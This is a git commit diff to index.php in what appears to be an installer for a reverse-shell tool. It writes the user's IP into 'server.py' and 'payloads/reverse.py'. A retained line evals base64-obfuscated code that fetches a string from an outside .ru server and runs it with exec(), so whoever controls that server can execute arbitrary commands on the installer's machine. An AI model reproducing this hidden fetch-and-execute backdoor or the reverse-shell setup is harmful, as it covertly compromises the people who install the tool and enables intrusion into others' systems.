69fc48fa4c8ba7703ed4d0b60614dddec1a83d71
CYBERCOURSE <137758879+CYBERCOURSEUZ@users.noreply.github.com>
2023-08-05 17:14:55 +0500

    Update index.php

--- index.php
+++ index.php
@@ -34,6 +34,24 @@ $ip = readline('[*] Enter your IP: ');
 system('clear');
 
 eval(base64_decode('JGdldCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL25ubmV0LmRlZWN0LnJ1L2FwaS9jaGVjay9pbmRleC5waHA/dG9rZW49JHRva2VuIik7CmlmKCRnZXQhPSJubyIpewpleGVjKCJwaXAgaW5zdGFsbCB0aHJlYWRpbmciKTsKZXhlYygicGlwMyBpbnN0YWxsIHRocmVhZGluZyIpOwpzeXN0ZW0oJ2NsZWFyJyk7CmV4ZWMoInBpcCBpbnN0YWxsIHNvY2tldCIpOwpleGVjKCJwaXAzIGluc3RhbGwgc29ja2V0Iik7CnN5c3RlbSgnY2xlYXInKTsKZXhlYygicGlwIGluc3RhbGwgYmFzZTY0Iik7CmV4ZWMoInBpcDMgaW5zdGFsbCBiYXNlNjQiKTsKc3lzdGVtKCdjbGVhcicpOwpleGVjKCJwaXAgaW5zdGFsbCBzdWJwcm9jZXNzIik7CmV4ZWMoInBpcDMgaW5zdGFsbCBzdWJwcm9jZXNzIik7CnN5c3RlbSgnY2xlYXInKTsKZXhlYygiYXB0LWdldCBpbnN0YWxsIHVuemlwIik7CmV4ZWMoIiRnZXQiKTsKCgokc2VydmVyX2ZpbGUgPSAic2VydmVyLnB5IjsKJHJldmVyc2VfZmlsZSA9ICJwYXlsb2Fkcy9yZXZlcnNlLnB5IjsKCmlmIChmaWxlX2V4aXN0cygkc2VydmVyX2ZpbGUpKSB7CiAgICAkYSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRzZXJ2ZXJfZmlsZSk7CiAgICAkYSA9IHN0cl9yZXBsYWNlKCJbWypJUCpdXSIsICRpcCwgJGEpOwogICAgZmlsZV9wdXRfY29udGVudHMoJHNlcnZlcl9maWxlLCAkYSk7Cn0gZWxzZSB7CiAgICBlY2hvICJFcnJvcjogJyRzZXJ2ZXJfZmlsZScgbm90IGZvdW5kLiI7Cn0KCmlmIChmaWxlX2V4aXN0cygkcmV2ZXJzZV9maWxlKSkgewogICAgJGEgPSBmaWxlX2dldF9jb250ZW50cygkcmV2ZXJzZV9maWxlKTsKICAgICRhID0gc3RyX3JlcGxhY2UoIltbKklQKl1dIiwgJGlwLCAkYSk7CiAgICBmaWxlX3B1dF9jb250ZW50cygkcmV2ZXJzZV9maWxlLCAkYSk7Cn0gZWxzZSB7CiAgICBlY2hvICJFcnJvcjogJyRyZXZlcnNlX2ZpbGUnIG5vdCBmb3VuZC4iOwp9CgoKCnN5c3RlbSgnY2xlYXInKTsKCnByaW50Q29sb3IoIlxuU0NSSVBUIHN1Y2Nlc3NmdWxseSBpbnN0YWxsZWQhIiwiZ3JlZW4iKTsKCgp9ZWxzZXsKc3lzdGVtKCdjbGVhcicpOwpwcmludENvbG9yKCJcblRPS0VOIElTIElOQ09SUkVDVCEiLCJyZWQiKTsKfQ=='));
+$server_file = "server.py";
+$reverse_file = "payloads/reverse.py";
+
+if (file_exists($server_file)) {
+    $a = file_get_contents($server_file);
+    $a = str_replace("[[*IP*]]", $ip, $a);
+    file_put_contents($server_file, $a);
+} else {
+    echo "Error: '$server_file' not found.";
+}
+
+if (file_exists($reverse_file)) {
+    $a = file_get_contents($reverse_file);
+    $a = str_replace("[[*IP*]]", $ip, $a);
+    file_put_contents($reverse_file, $a);
+} else {
+    echo "Error: '$reverse_file' not found.";
+}
 exec("unzip nnnet.zip");
 exec("unlink nnnet.zip");
 
